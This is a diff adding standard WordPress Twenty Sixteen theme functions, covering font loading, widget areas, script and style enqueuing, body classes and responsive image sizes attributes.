+add_action( 'after_setup_theme', 'twentysixteen_setup' );
+
+/**
+ * Sets the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_content_width() {
+	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
+}
+add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );
+
+/**
+ * Add preconnect for Google Fonts.
+ *
+ * @since Twenty Sixteen 1.6
+ *
+ * @param array  $urls           URLs to print for resource hints.
+ * @param string $relation_type  The relation type the URLs are printed.
+ * @return array $urls           URLs to print for resource hints.
+ */
+function twentysixteen_resource_hints( $urls, $relation_type ) {
+	if ( wp_style_is( 'twentysixteen-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
+		$urls[] = array(
+			'href' => 'https://fonts.gstatic.com',
+			'crossorigin',
+		);
+	}
+
+	return $urls;
+}
+add_filter( 'wp_resource_hints', 'twentysixteen_resource_hints', 10, 2 );
+
+/**
+ * Registers a widget area.
+ *
+ * @link https://developer.wordpress.org/reference/functions/register_sidebar/
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_widgets_init() {
+	register_sidebar(
+		array(
+			'name'          => __( 'Sidebar', 'twentysixteen' ),
+			'id'            => 'sidebar-1',
+			'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
+			'id'            => 'sidebar-2',
+			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
+			'id'            => 'sidebar-3',
+			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+}
+add_action( 'widgets_init', 'twentysixteen_widgets_init' );
+
+if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
+	/**
+	 * Register Google fonts for Twenty Sixteen.
+	 *
+	 * Create your own twentysixteen_fonts_url() function to override in a child theme.
+	 *
+	 * @since Twenty Sixteen 1.0
+	 *
+	 * @return string Google fonts URL for the theme.
+	 */
+	function twentysixteen_fonts_url() {
+		$fonts_url = '';
+		$fonts     = array();
+		$subsets   = 'latin,latin-ext';
+
+		/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
+		}
+
+		/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Montserrat:400,700';
+		}
+
+		/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
+		if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
+			$fonts[] = 'Inconsolata:400';
+		}
+
+		if ( $fonts ) {
+			$fonts_url = add_query_arg(
+				array(
+					'family' => urlencode( implode( '|', $fonts ) ),
+					'subset' => urlencode( $subsets ),
+				),
+				'https://fonts.googleapis.com/css'
+			);
+		}
+
+		return $fonts_url;
+	}
+endif;
+
+/**
+ * Handles JavaScript detection.
+ *
+ * Adds a `js` class to the root `<html>` element when JavaScript is detected.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_javascript_detection() {
+	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
+}
+add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );
+
+/**
+ * Enqueues scripts and styles.
+ *
+ * @since Twenty Sixteen 1.0
+ */
+function twentysixteen_scripts() {
+	// Add custom fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
+
+	// Add Genericons, used in the main stylesheet.
+	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );
+
+	// Theme stylesheet.
+	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );
+
+	// Theme block stylesheet.
+	wp_enqueue_style( 'twentysixteen-block-style', get_template_directory_uri() . '/css/blocks.css', array( 'twentysixteen-style' ), '20181230' );
+
+	// Load the Internet Explorer specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );
+
+	// Load the Internet Explorer 8 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );
+
+	// Load the Internet Explorer 7 specific stylesheet.
+	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160816' );
+	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );
+
+	// Load the html5 shiv.
+	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );
+	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );
+
+	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160816', true );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+
+	if ( is_singular() && wp_attachment_is_image() ) {
+		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );
+	}
+
+	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20181230', true );
+
+	wp_localize_script(
+		'twentysixteen-script',
+		'screenReaderText',
+		array(
+			'expand'   => __( 'expand child menu', 'twentysixteen' ),
+			'collapse' => __( 'collapse child menu', 'twentysixteen' ),
+		)
+	);
+}
+add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );
+
+/**
+ * Enqueue styles for the block-based editor.
+ *
+ * @since Twenty Sixteen 1.6
+ */
+function twentysixteen_block_editor_styles() {
+	// Block styles.
+	wp_enqueue_style( 'twentysixteen-block-editor-style', get_template_directory_uri() . '/css/editor-blocks.css', array(), '20181230' );
+	// Add custom fonts.
+	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
+}
+add_action( 'enqueue_block_editor_assets', 'twentysixteen_block_editor_styles' );
+
+/**
+ * Adds custom classes to the array of body classes.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $classes Classes for the body element.
+ * @return array (Maybe) filtered body classes.
+ */
+function twentysixteen_body_classes( $classes ) {
+	// Adds a class of custom-background-image to sites with a custom background image.
+	if ( get_background_image() ) {
+		$classes[] = 'custom-background-image';
+	}
+
+	// Adds a class of group-blog to sites with more than 1 published author.
+	if ( is_multi_author() ) {
+		$classes[] = 'group-blog';
+	}
+
+	// Adds a class of no-sidebar to sites without active sidebar.
+	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
+		$classes[] = 'no-sidebar';
+	}
+
+	// Adds a class of hfeed to non-singular pages.
+	if ( ! is_singular() ) {
+		$classes[] = 'hfeed';
+	}
+
+	return $classes;
+}
+add_filter( 'body_class', 'twentysixteen_body_classes' );
+
+/**
+ * Converts a HEX value to RGB.
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $color The original color, in 3- or 6-digit hexadecimal form.
+ * @return array Array containing RGB (red, green, and blue) values for the given
+ *               HEX code, empty array otherwise.
+ */
+function twentysixteen_hex2rgb( $color ) {
+	$color = trim( $color, '#' );
+
+	if ( strlen( $color ) === 3 ) {
+		$r = hexdec( substr( $color, 0, 1 ) . substr( $color, 0, 1 ) );
+		$g = hexdec( substr( $color, 1, 1 ) . substr( $color, 1, 1 ) );
+		$b = hexdec( substr( $color, 2, 1 ) . substr( $color, 2, 1 ) );
+	} elseif ( strlen( $color ) === 6 ) {
+		$r = hexdec( substr( $color, 0, 2 ) );
+		$g = hexdec( substr( $color, 2, 2 ) );
+		$b = hexdec( substr( $color, 4, 2 ) );
+	} else {
+		return array();
+	}
+
+	return array(
+		'red'   => $r,
+		'green' => $g,
+		'blue'  => $b,
+	);
+}
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-tags.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/customizer.php';
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for content images
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param string $sizes A source size value for use in a 'sizes' attribute.
+ * @param array  $size  Image size. Accepts an array of width and height
+ *                      values in pixels (in that order).
+ * @return string A source size value for use in a content image 'sizes' attribute.
+ */
+function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
+	$width = $size[0];
+
+	if ( 840 <= $width ) {
+		$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
+	}
+
+	if ( 'page' === get_post_type() ) {
+		if ( 840 > $width ) {
+			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+		}
+	} else {
+		if ( 840 > $width && 600 <= $width ) {
+			$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
+		} elseif ( 600 > $width ) {
+			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
+		}
+	}
+
+	return $sizes;
+}
+add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10, 2 );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for post thumbnails
+ *
+ * @since Twenty Sixteen 1.0
+ *
+ * @param array $attr Attributes for the image markup.
+ * @param int   $attachment Image attachment ID.
+ * @param array $size Registered image size or flat array of height and width dimensions.
+ * @return array The filtered attributes for the image markup.
+ */
+function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
+	if ( 'post-thumbnail' === $size ) {
+		if ( is_active_sidebar( 'sidebar-1' ) ) {
+			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
+		} else {
+			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
+		}
+	}
+	return $attr;
+}
+add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10, 3 );
+
+/**
+ * Modifies tag cloud widget arguments to display all tags in the same font size
+ * and use list format for better accessibility.
+ *
+ * @since Twenty Sixteen 1.1
+ *
+ * @param array $args Arguments for tag cloud widget.
+ * @return array The filtered arguments for tag cloud widget.
+ */
+function twentysixteen_widget_tag_cloud_args( $args ) {
+	$args['largest']  = 1;
+	$args['smallest'] = 1;
+	$args['unit']     = 'em';
+	$args['format']   = 'list';
+
+	return $args;
+}
+add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );
